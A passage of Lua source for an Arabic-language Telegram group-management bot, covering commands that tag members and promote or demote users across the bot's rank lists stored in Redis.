local BrAnDTeAM= {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_BrAnD(msg.chat_id_, result.id_, 1,''..BrAnDTEAM[math.random(#BrAnDTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     SoUrCe BrAnD     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function BrAnDTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local BrAnDTeAM= "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md') 
local BrAnDTeAM= { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_BrAnD(msg.chat_id_, result.id_, 1,''..BrAnDTEAM[math.random(#BrAnDTEAM)]..'', 1, 'html') 
else  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,BrAnDTEAM)
end
end
end
--     SoUrCe BrAnD     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:VipAll:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من ↫ ⤈\n~ ( "..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ لم تتم ترقيته مسبقا")  
end
if BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevBrAnD:srem(BrAnD..'BrAnD:SudoBot:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'BrAnDconstructor' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevBrAnD:sismember(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من ↫ ⤈\n~ ( "..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"reply","♰ ⌯ لم تتم ترقيته مسبقا")  
end 
if BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevBrAnD:srem(BrAnD..'BrAnD:SudoBot:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'BrAnDconstructor' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_, result.id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:Managers:'..msg.chat_id_, result.id_)
elseif BrAnDDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     SoUrCe BrAnD     --
--       Set SudoBot      --
if Sudo(msg) then
if text ==('رفع مطور') and SoUrCeCh(msg) then
function sudo_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المطورين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع مطور (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:SudoBot:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المطورين")  
end
--     SoUrCe BrAnD     --
--       Rem SudoBot      --
if text ==('تنزيل مطور') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المطورين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل مطور (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:SudoBot:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المطورين")  
end end
--     SoUrCe BrAnD     --
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('رفع مدير عام') and SoUrCeCh(msg) then
function raf_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المدراء العامين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:ManagerAll:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المدراء العامين")  
end
--     SoUrCe BrAnD     --
--      Rem ManagerAll    --
if text ==('تنزيل مدير عام') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المدراء العامين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:ManagerAll:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المدراء العامين")  
end end
--     SoUrCe BrAnD     --
--      Set adminall      --
if ManagerAll(msg) then
if text ==('رفع ادمن عام') and SoUrCeCh(msg) then
function raf_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة الادمنيه العامين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:AdminAll:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة الادمنيه العامين")  
end
--     SoUrCe BrAnD     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة الادمنيه العامين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:AdminAll:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة الادمنيه العامين")  
end end
--     SoUrCe BrAnD     --
--       Set Vipall       --
if AdminAll(msg) then
if text ==('رفع مميز عام') and SoUrCeCh(msg) then
function raf_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المميزين العام")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:VipAll:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المميزين العام")  
end
--     SoUrCe BrAnD     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المميزين العام")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:VipAll:',user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله من قائمة المميزين العام")  
end end
--     SoUrCe BrAnD     --
--  Set BasicConstructor  --
if ChatType == 'sp' or ChatType == 'gp'  then
if BrAnDConstructor(msg) then
if text ==('رفع منشئ اساسي') and SoUrCeCh(msg) then
function raf_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه منشئ اساسي")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه منشئ اساسي")  
end
--     SoUrCe BrAnD     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله منشئ اساسي")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SoUrCeCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not BrAnDConstructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ هذا الامر لمنشئ المجموعه والمطورين فقط', 1, 'md')
end
--     SoUrCe BrAnD     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and SoUrCeCh(msg) then
function raf_reply(extra, result, success)
DevBrAnD:sadd(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SoUrCeCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفعه في قائمة المنشئين")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SoUrCeCh(msg) then
local user = text:match('رفع منشئ (%d+)')
DevBrAnD:sadd(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفعه في قائمة المنشئين")  
end
--     SoUrCe BrAnD     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and SoUrCeCh(msg) then
function prom_reply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SoUrCeCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تنزيله من قائمة المنشئين")  
